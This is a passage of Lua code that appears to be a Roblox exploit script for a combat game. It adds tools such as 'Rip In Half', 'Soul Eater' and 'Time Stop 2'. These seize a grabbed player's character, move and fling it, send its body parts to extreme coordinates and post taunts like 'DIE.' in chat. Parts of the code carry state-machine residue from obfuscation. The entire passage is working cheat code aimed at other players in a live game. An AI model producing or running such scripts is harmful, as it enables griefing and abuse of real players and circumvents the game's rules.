                        end
                    end 
        
        
                    game:GetService('RunService'):UnbindFromRenderStep("Pos")
                    game:GetService('RunService'):BindToRenderStep("Pos", 0 , function()
                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                    end)
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 9 + Vector3.new(0,1,0)
                    wait(3)
                    local Animation = Instance.new("Animation");
                    Animation.AnimationId = "rbxassetid://16768625968";
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                    LoadAnimation.Priority = Enum.AnimationPriority.Action;
                    LoadAnimation:Play();
                    wait(1)
                    Play(203773793);
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, -0.1, 0);
                    wait(2)
                    StopAudio()
                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(game.Players[target].Character.UpperTorso.CFrame * CFrame.new(0, 0, 3))
                    wait(2)
                    local Animation = Instance.new("Animation")
                    Animation.AnimationId = "rbxassetid://2791328524"
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
                    LoadAnimation.Priority = Enum.AnimationPriority.Action
                    LoadAnimation:Play()
                    wait(3)
                    local Animation = Instance.new("Animation")
                    Animation.AnimationId = "rbxassetid://3354696735"
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
                    LoadAnimation.Priority = Enum.AnimationPriority.Action
                    LoadAnimation:Play()
        
        
                    Play(8595977193);
        
                    wait(2)
                    StopAudio()
                    wait(1)
                    game:GetService("RunService"):UnbindFromRenderStep("Pos");
                    game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                        game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                    end);
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20) + Vector3.new(0, 6, 0);
                    local Animation = Instance.new("Animation");
                    Animation.AnimationId = "rbxassetid://11394033602";
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                    LoadAnimation.Priority = Enum.AnimationPriority.Action;
                    LoadAnimation:Play();
                    LoadAnimation:AdjustSpeed(1);
                    wait(9)
                    LoadAnimation:Stop()
                    game:GetService("RunService"):UnbindFromRenderStep("Pos");
                    for _, descendant in ipairs(targetCharacter:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            descendant.CanCollide = false;
                        end
                    end
                    task.wait(0.1);
                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                    task.wait(1);
                    game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
        
                end
                end
            end)
        
        
        
        
        
        
        
            local LocalPlayer = game:GetService("Players").LocalPlayer
            local TIMESTOP2TOOL = Instance.new("Tool", LocalPlayer.Backpack)
            local Mouse = LocalPlayer:GetMouse()
            local OriginalKeyUpValue = 0
            TIMESTOP2TOOL.RequiresHandle = false
            TIMESTOP2TOOL.Name = "Time Stop 2"
            
            TIMESTOP2TOOL.Activated:Connect(function()
                if Grabbed then
                    if not Up then
                        local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        local targetCharacter = game.Players[target].Character
        
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        for i, Track in pairs (game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if Track.Animation.AnimationId == "rbxassetid://3135389157" then
                            Track:Stop()
                        end
                    end 
        
        
                    game:GetService('RunService'):UnbindFromRenderStep("Pos")
                    game:GetService('RunService'):BindToRenderStep("Pos", 0 , function()
                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                    end)
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 5 + Vector3.new(0,1,0)
                    chat("when timed is stop there is only dio.")
        
                    wait(2)
                    chat("5")
                    wait(2)
                    chat("4")
                    wait(2)
                    chat("3")
                    wait(2)
                    chat("2")
                    wait(2)
                    chat("1...")
                    wait(3)
                    local Animmm = Instance.new("Animation")
                    Animmm.AnimationId = "rbxassetid://5104341999"
                    Animmm.Name = "BarrageAnim"
                    local krr = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Animmm)
                    krr:Play()
                    krr:AdjustSpeed(2000)
                    Play(616593932)
                    chat("MUDA MUDA MUDA MUDA MUDA....")
                    wait(4)
        
                    StopAudio()
                    krr:Stop()
        
        
        
                    Play(8595977193);
        
                    local Animation = Instance.new("Animation")
                    Animation.AnimationId = "rbxassetid://3354696735"
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
                    LoadAnimation.Priority = Enum.AnimationPriority.Action
                    LoadAnimation:Play()
                    wait(1)
                    StopAudio()
                    wait(1)
                    Play(6186697921);
                    chat("Time Shall Move Again.")
                    wait(2)
        
        
                    Play(5687891658);
        
        
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20 + Vector3.new(0,1,0)
        
                    wait(2)
                    StopAudio()
                    wait(1)
                    game.Players[target].Character.LowerTorso.Position = Vector3.new(0,-600,0)
                    game:GetService('RunService'):UnbindFromRenderStep("Pos")
                    task.wait(0.2)
                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy()
                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy()
                    task.wait(0.1)
                    game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*90
                    game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*-90
                    game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*-90
                    Play(7307838125);
                    wait(1)
                    StopAudio()
                end
                end
            end)
        
        
        
        
        
        
        
        
            
            
            
        
        
        
            
            
        
            
            
        
        
            local LocalPlayer = game:GetService("Players").LocalPlayer
            local RipInHalfTool = Instance.new("Tool", LocalPlayer.Backpack)
            local Mouse = LocalPlayer:GetMouse()
            local OriginalKeyUpValue = 0
            RipInHalfTool.RequiresHandle = false
            RipInHalfTool.Name = "Rip In Half"
            
            RipInHalfTool.Activated:Connect(function()
                if Grabbed then
                    if not Up then
                        local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        local targetCharacter = game.Players[target].Character
            
                        for _, Track in pairs(LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if Track.Animation.AnimationId == "rbxassetid://3135389157" then
                                Track:Stop()
                            end
                        end
        
                local Animation1 = Instance.new("Animation")
                Animation1.AnimationId = "rbxassetid://13850666420"
                local LoadAnimation1 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation1)
                LoadAnimation1.Priority = Enum.AnimationPriority.Action
                LoadAnimation1:Play()

                local Animation2 = Instance.new("Animation")
                Animation2.AnimationId = "rbxassetid://13850675130"
                local LoadAnimation2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation2)
                LoadAnimation2.Priority = Enum.AnimationPriority.Action
                LoadAnimation2:Play()
                game:GetService('RunService'):UnbindFromRenderStep("Pos")
                game:GetService('RunService'):BindToRenderStep("Pos", 0 , function()
                game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2 + Vector3.new(0,0.2,0)
                end)
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Im gonna rip you in half now.", "All")
                Play("7148332723")
                task.wait(2.30)
                task.wait(0.2)
                game.Players[target].Character.LowerTorso.Position = Vector3.new(0,-600,0)
                game:GetService('RunService'):UnbindFromRenderStep("Pos")
                task.wait(0.2)
                game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy()
                game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy()
                task.wait(0.1)
                game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*90
                game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*-90
                game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector*-90
                task.wait(0.3)
                game:GetService("ReplicatedStorage").MainEvent:FireServer('Grabbing', false)
                Play("7307838125")
                wait(1)
                StopAudio()
                task.wait(0.2)
                LoadAnimation1:Stop(0.3)
                LoadAnimation2:Stop(0.3)
        
            end
                end
            end)
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
            
            
        
            local LocalPlayer = game:GetService("Players").LocalPlayer
            local HahahahaTool = Instance.new("Tool", LocalPlayer.Backpack)
            local Mouse = LocalPlayer:GetMouse()
            local OriginalKeyUpValue = 0
            HahahahaTool.RequiresHandle = false
            HahahahaTool.Name = "HAAHAHAH."
            
            HahahahaTool.Activated:Connect(function()
                if Grabbed then
                    if not Up then
                        local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        local targetCharacter = game.Players[target].Character
        
                        for _, Track in pairs(LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if Track.Animation.AnimationId == "rbxassetid://3135389157" then
                                Track:Stop()
                            end
                        end
        
                        game:GetService('RunService'):UnbindFromRenderStep("Pos")
                        game:GetService('RunService'):BindToRenderStep("Pos", 0 , function()
                        game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                        end)
        
                        chat("hahahahahah..")
                        Play("8169236021")
                        wait(2)
                        StopAudio()
        
                        local Animation = Instance.new("Animation")
                        Animation.AnimationId = "rbxassetid://3354696735"
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
                        LoadAnimation.Priority = Enum.AnimationPriority.Action
                        LoadAnimation:Play()
                        Play("8595980577")
                        wait(1)
        
                        StopAudio()
        
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20 + Vector3.new(0,1,0)
                    wait(2)
                    Play("8643750815")
                    local Animation = Instance.new("Animation");
                    Animation.AnimationId = "rbxassetid://16768625968";
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                    LoadAnimation.Priority = Enum.AnimationPriority.Action;
                    LoadAnimation:Play();
        
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 3 + Vector3.new(0,1,0)
        
                    wait(2)
                    StopAudio()
                    local Animation = Instance.new("Animation")
                    Animation.AnimationId = "rbxassetid://3354696735"
                    local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation)
                    LoadAnimation.Priority = Enum.AnimationPriority.Action
                    LoadAnimation:Play()
                    game.Players[target].Character.UpperTorso.BodyPosition.D = 1200
                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20 + Vector3.new(0,1,0)
                    Play("8595980577")
                    wait(2)
                    StopAudio()
                    wait(1)
                    Play(7307838125);
                    wait(1)
                    StopAudio()
                    wait(1)
                    game.Players[target].Character.RightUpperLeg.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.RightUpperArm.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.LeftUpperArm.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.UpperTorso.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.Head.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.LowerTorso.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.LeftLowerLeg.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.RightLowerLeg.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.LeftFoot.Position = Vector3.new(0, -1000630, 0);
                    game.Players[target].Character.RightFoot.Position = Vector3.new(0, -1000630, 0);
                    end
                end
            end)
        
                
            
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local SoulTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            SoulTool.RequiresHandle = false;
            SoulTool.Name = "Soul Eater";
            SoulTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 3) + Vector3.new(0, 1, 0);
                        task.wait(0.1);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://14496531574";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(1);
                        wait(0.7);
                        LoadAnimation:Stop(0.3);
                        wait(0.6);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20) + Vector3.new(0, 35, 0);
                        task.wait(1);
                        Grabbed = true;
                        Up = false;
                        local floatHeight = 17;
                        local floatDuration = 3;
                        local stayDuration1 = 1;
                        local stayDuration2 = 1;
                        local stayDuration3 = 1.3;
                        local stayDuration4 = 2.7;
                        local stayDuration5 = 0.7;
                        local stayDuration6 = 1.2;
                        local player = game.Players.LocalPlayer;
                        local character = player.Character or player.CharacterAdded:Wait();
                        local humanoidRootPart = character:WaitForChild("HumanoidRootPart");
                        local humanoid = character:WaitForChild("Humanoid");
                        AnimPlay(11394033602, 0.6);
                        local function smoothFloat()
                            local FlatIdent_691EB = 0;
                            local startPosition;
                            local targetHeight;
                            local timeElapsed;
                            local stayElapsed1;
                            local stayElapsed2;
                            local stayElapsed3;
                            local stayElapsed4;
                            local stayElapsed5;
                            local stayElapsed6;
                            while true do
                                if (FlatIdent_691EB == 7) then
                                    game.Players[target].Character.LowerTorso.Position = Vector3.new(0, -630000, 0);
                                    game.Players[target].Character.Head.Position = Vector3.new(0, -630000, 0);
                                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                                    game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                                    for _, descendant in ipairs(targetCharacter:GetDescendants()) do
                                        if descendant:IsA("BasePart") then
                                            descendant.CanCollide = false;
                                        end
                                    end
                                    FlatIdent_691EB = 8;
                                end
                                if (FlatIdent_691EB == 0) then
                                    startPosition = humanoidRootPart.Position;
                                    targetHeight = startPosition.Y + floatHeight;
                                    timeElapsed = 0;
                                    while timeElapsed < floatDuration do
                                        local newY = startPosition.Y + ((targetHeight - startPosition.Y) * (timeElapsed / floatDuration));
                                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, newY, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                        timeElapsed = timeElapsed + game:GetService("RunService").Heartbeat:Wait();
                                    end
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    FlatIdent_691EB = 1;
                                end
                                if (FlatIdent_691EB == 5) then
                                    StopAudio();
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed5 = 0;
                                    while stayElapsed5 < stayDuration5 do
                                        local FlatIdent_82923 = 0;
                                        while true do
                                            if (FlatIdent_82923 == 0) then
                                                humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_82923 = 1;
                                            end
                                            if (1 == FlatIdent_82923) then
                                                stayElapsed5 = stayElapsed5 + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                        end
                                    end
                                    task.wait(0.1);
                                    FlatIdent_691EB = 6;
                                end
                                if (FlatIdent_691EB == 9) then
                                    AnimStop(754656200, 0.3);
                                    timeElapsed = 0;
                                    while timeElapsed < floatDuration do
                                        local FlatIdent_1468D = 0;
                                        local newY;
                                        while true do
                                            if (FlatIdent_1468D == 0) then
                                                newY = targetHeight - ((targetHeight - startPosition.Y) * (timeElapsed / floatDuration));
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, newY, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_1468D = 1;
                                            end
                                            if (FlatIdent_1468D == 1) then
                                                timeElapsed = timeElapsed + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                        end
                                    end
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, startPosition.Y, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    break;
                                end
                                if (FlatIdent_691EB == 1) then
                                    Play(506001681);
                                    chat("DIE.");
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed1 = 0;
                                    while stayElapsed1 < stayDuration1 do
                                        local FlatIdent_5E109 = 0;
                                        while true do
                                            if (FlatIdent_5E109 == 0) then
                                                humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_5E109 = 1;
                                            end
                                            if (FlatIdent_5E109 == 1) then
                                                stayElapsed1 = stayElapsed1 + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                        end
                                    end
                                    FlatIdent_691EB = 2;
                                end
                                if (FlatIdent_691EB == 4) then
                                    AnimPlay(754656200, 0.3);
                                    Play(9126214600);
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed4 = 0;
                                    while stayElapsed4 < stayDuration4 do
                                        humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                        stayElapsed4 = stayElapsed4 + game:GetService("RunService").Heartbeat:Wait();
                                    end
                                    FlatIdent_691EB = 5;
                                end
                                if (FlatIdent_691EB == 6) then
                                    Grabbed = true;
                                    Up = false;
                                    Play(7307838125);
                                    AnimStop(11394033602, 0.3);
                                    game.Players[target].Character.UpperTorso.Position = Vector3.new(0, -630000, 0);
                                    FlatIdent_691EB = 7;
                                end
                                if (FlatIdent_691EB == 3) then
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed3 = 0;
                                    while stayElapsed3 < stayDuration3 do
                                        local FlatIdent_44603 = 0;
                                        while true do
                                            if (FlatIdent_44603 == 0) then
                                                humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_44603 = 1;
                                            end
                                            if (FlatIdent_44603 == 1) then
                                                stayElapsed3 = stayElapsed3 + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                        end
                                    end
                                    StopAudio();
                                    task.wait(0.1);
                                    FlatIdent_691EB = 4;
                                end
                                if (FlatIdent_691EB == 2) then
                                    chat("DIE..");
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed2 = 0;
                                    while stayElapsed2 < stayDuration2 do
                                        local FlatIdent_15A17 = 0;
                                        while true do
                                            if (FlatIdent_15A17 == 1) then
                                                stayElapsed2 = stayElapsed2 + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                            if (FlatIdent_15A17 == 0) then
                                                humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_15A17 = 1;
                                            end
                                        end
                                    end
                                    chat("DIEE!");
                                    FlatIdent_691EB = 3;
                                end
                                if (FlatIdent_691EB == 8) then
                                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                    stayElapsed6 = 0;
                                    while stayElapsed6 < stayDuration6 do
                                        local FlatIdent_5962D = 0;
                                        while true do
                                            if (0 == FlatIdent_5962D) then
                                                humanoidRootPart.Velocity = Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z);
                                                humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, targetHeight, humanoidRootPart.Position.Z) * CFrame.Angles(0, math.rad(humanoidRootPart.Orientation.Y), 0);
                                                FlatIdent_5962D = 1;
                                            end
                                            if (FlatIdent_5962D == 1) then
                                                stayElapsed6 = stayElapsed6 + game:GetService("RunService").Heartbeat:Wait();
                                                break;
                                            end
                                        end
                                    end
                                    game:GetService("RunService"):UnbindFromRenderStep("Pos");
                                    game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                                    FlatIdent_691EB = 9;
                                end
                            end
                        end
                        smoothFloat();
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local StraightTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            StraightTool.RequiresHandle = false;
            StraightTool.Name = "Straight KnockOut";
            StraightTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        local targetCharacter = game.Players[target].Character;
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, -0.1, 0);
                        task.wait(0.1);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://10717116749";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        wait(1.3);
                        Play(5493355091);
                        task.wait(0.7);
                        Play(5493355091);
                        task.wait(0.4);
                        LoadAnimation:Stop(0);
                        task.wait(0.1);
                        AnimPlay(3354699999, 1);
                        task.wait(1.2);
                        AnimStop(3354699999, 0.3);
                        task.wait(0.1);
                        Play(5660393410);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 700;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 10) + Vector3.new(0, 10, 0);
                        for _, descendant in ipairs(targetCharacter:GetDescendants()) do
                            if descendant:IsA("BasePart") then
                                descendant.CanCollide = false;
                            end
                        end
                        task.wait(0.1);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        task.wait(1);
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local GonsTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            GonsTool.RequiresHandle = false;
            GonsTool.Name = "Gons Rage";
            GonsTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        local targetCharacter = game.Players[target].Character;
